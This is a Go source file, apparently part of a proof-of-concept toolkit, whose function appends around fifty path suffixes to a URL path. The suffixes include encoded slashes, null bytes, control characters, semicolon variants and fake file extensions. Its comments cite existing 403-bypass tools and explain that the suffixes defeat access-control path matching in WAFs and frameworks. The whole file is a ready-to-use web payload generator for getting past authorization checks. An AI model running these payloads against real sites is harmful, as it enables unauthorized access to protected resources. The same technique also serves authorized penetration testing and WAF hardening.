package poc

// EndPaths 生成路径末尾变异 payload
// ref: nomore403 endpaths technique, daffainfo/bypass-403
// 原理: 在路径末尾添加特殊后缀，干扰 ACL 路径匹配
// 部分 WAF/框架在匹配路径时不处理尾部特殊字符
func EndPaths(auth string) []string {
	endSuffixes := []string{
		// 点和斜线组合
		"/.",
		"/..",
		"/./.",
		"/.././",
		"/..;/",
		"/../",
		"/..%00/",
		"/..%0d/",
		"/..%0a/",
		"/..%5c/",
		"/..%ff/",
		// 编码斜线
		"/%2e",
		"/%2e/",
		"/%2e%2e",
		"/%2e%2e/",
		"/%2f",
		"/%2f/",
		// 空字节和控制字符
		"%00",
		"%00/",
		"%20",
		"%20/",
		"%09",
		"%09/",
		// 通配符
		"/*",
		"/*/",
		"/**",
		"/**/",
		// 分号变体
		";/",
		";;/",
		";%2f",
		";%09",
		";%09/",
		";%00",
		// 反斜杠
		"\\",
		"%5c",
		"%5c/",
		// 井号
		"%23",
		"%23/",
		// 特殊组合
		"/.randomstring",
		"..;/",
		";.css",
		";.js",
		";.json",
		".json",
	}

	var results []string
	for _, suffix := range endSuffixes {
		results = append(results, auth+suffix)
	}
	return results
}
